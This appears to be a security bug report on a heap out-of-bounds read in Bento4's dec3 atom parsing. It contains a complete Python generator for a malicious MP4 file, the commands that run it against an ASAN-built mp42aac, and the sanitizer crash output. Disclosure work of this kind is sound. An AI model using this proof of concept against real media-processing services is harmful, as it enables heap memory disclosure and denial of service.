## Bug0: Heap Over-Read in AP4_Dec3Atom Constructor Due to Missing payload[3] Bounds Check

In `AP4_Dec3Atom::AP4_Dec3Atom` (`Ap4Dec3Atom.cpp`, lines 96–104), the loop guard checks only `payload_size < 3` but unconditionally reads `payload[3]` when `num_dep_sub` is non-zero, allowing a one-byte heap out-of-bounds read that then triggers an unsigned integer wrap-around in `payload_size`, enabling up to seven additional out-of-bounds reads totaling over 30 bytes of adjacent heap data.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import os

def pack_box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload

def pack_fullbox(box_type, version, flags, payload):
    fb = (struct.pack('>B', version) +
          struct.pack('>I', flags & 0xFFFFFF)[1:4] +
          payload)
    return pack_box(box_type, fb)

# Crafted dec3 box (13 bytes total, 5-byte payload):
#   payload[0] = 0x00  DataRate high byte
#   payload[1] = 0x07  DataRate low | substream_count bits[2:0]=7 -> count=8
#   payload[2] = 0x00  loop iter 0 byte 0
#   payload[3] = 0x00  loop iter 0 byte 1
#   payload[4] = 0x02  loop iter 0 byte 2: (0x02>>1)&0xF=1 -> num_dep_sub=1
#                       code then reads payload[3] (original byte 5) -> OOB
dec3_payload = bytes([0x00, 0x07, 0x00, 0x00, 0x02])
dec3_box = struct.pack('>I', 13) + b'dec3' + dec3_payload

audio_sample_entry_header = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    b'\x00' * 8 +
    struct.pack('>H', 2) +
    struct.pack('>H', 16) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>HH', 48000, 0)
)
ec3_entry_payload = audio_sample_entry_header + dec3_box
ec3_entry = pack_box(b'ec-3', ec3_entry_payload)

stsd = pack_fullbox(b'stsd', 0, 0, struct.pack('>I', 1) + ec3_entry)
stts = pack_fullbox(b'stts', 0, 0,
    struct.pack('>I', 1) +
    struct.pack('>II', 1, 1024))
stsc = pack_fullbox(b'stsc', 0, 0,
    struct.pack('>I', 1) +
    struct.pack('>III', 1, 1, 1))
stsz = pack_fullbox(b'stsz', 0, 0,
    struct.pack('>II', 0, 1) +
    struct.pack('>I', 100))

def make_stco(offset):
    return pack_fullbox(b'stco', 0, 0,
        struct.pack('>I', 1) +
        struct.pack('>I', offset))

stco_placeholder = make_stco(0)
stbl_placeholder = pack_box(b'stbl', stsd + stts + stsc + stsz + stco_placeholder)

url_box = pack_fullbox(b'url ', 0, 1, b'')
dref = pack_fullbox(b'dref', 0, 0, struct.pack('>I', 1) + url_box)
dinf = pack_box(b'dinf', dref)
smhd = pack_fullbox(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf_placeholder = pack_box(b'minf', smhd + dinf + stbl_placeholder)

mdhd = pack_fullbox(b'mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 44100, 1000) +
    struct.pack('>HH', 0x55C4, 0))
hdlr = pack_fullbox(b'hdlr', 0, 0,
    struct.pack('>I', 0) +
    b'soun' +
    b'\x00' * 12 +
    b'Sound\x00')
mdia_placeholder = pack_box(b'mdia', mdhd + hdlr + minf_placeholder)

identity_matrix = (
    struct.pack('>I', 0x00010000) + struct.pack('>I', 0) + struct.pack('>I', 0) +
    struct.pack('>I', 0) + struct.pack('>I', 0x00010000) + struct.pack('>I', 0) +
    struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 0x40000000)
)
tkhd = pack_fullbox(b'tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 1000) +
    b'\x00' * 8 +
    struct.pack('>HHH', 0, 0, 0x0100) +
    struct.pack('>H', 0) +
    identity_matrix +
    struct.pack('>II', 0, 0))

trak_placeholder = pack_box(b'trak', tkhd + mdia_placeholder)

mvhd = pack_fullbox(b'mvhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 1000) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    identity_matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2))

moov_placeholder = pack_box(b'moov', mvhd + trak_placeholder)
ftyp = pack_box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')
mdat_data = b'\x00' * 100
mdat = pack_box(b'mdat', mdat_data)

mdat_offset = len(ftyp) + len(moov_placeholder) + 8
stco_fixed = make_stco(mdat_offset)
stbl_fixed = pack_box(b'stbl', stsd + stts + stsc + stsz + stco_fixed)
minf_fixed = pack_box(b'minf', smhd + dinf + stbl_fixed)
mdia_fixed = pack_box(b'mdia', mdhd + hdlr + minf_fixed)
trak_fixed = pack_box(b'trak', tkhd + mdia_fixed)
moov_fixed = pack_box(b'moov', mvhd + trak_fixed)

output = ftyp + moov_fixed + mdat
with open('poc_input.mp4', 'wb') as f:
    f.write(output)
print(f"Written {len(output)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f5 at pc 0x562d43127e2d bp 0x7fff1500c8c0 sp 0x7fff1500c8b0
READ of size 1 at 0x5020000000f5 thread T0
    #0 0x562d43127e2c in AP4_Dec3Atom::AP4_Dec3Atom(unsigned int, unsigned char const*)
    #1 0x562d43129c8a in AP4_Dec3Atom::Create(unsigned int, AP4_ByteStream&)

### Impact

An attacker who supplies a crafted MP4 file with a malformed `dec3` box can cause `mp42aac` to read up to 30 or more bytes beyond the end of a heap allocation, potentially disclosing adjacent heap contents such as pointers and library addresses that can be used to defeat ASLR. In server-side transcoding deployments where `mp42aac` processes untrusted input files, this out-of-bounds read is remotely triggerable and constitutes an information-disclosure vulnerability. The additional unsigned integer wrap-around in `payload_size` can also cause the process to access unmapped memory and crash, leading to denial of service.
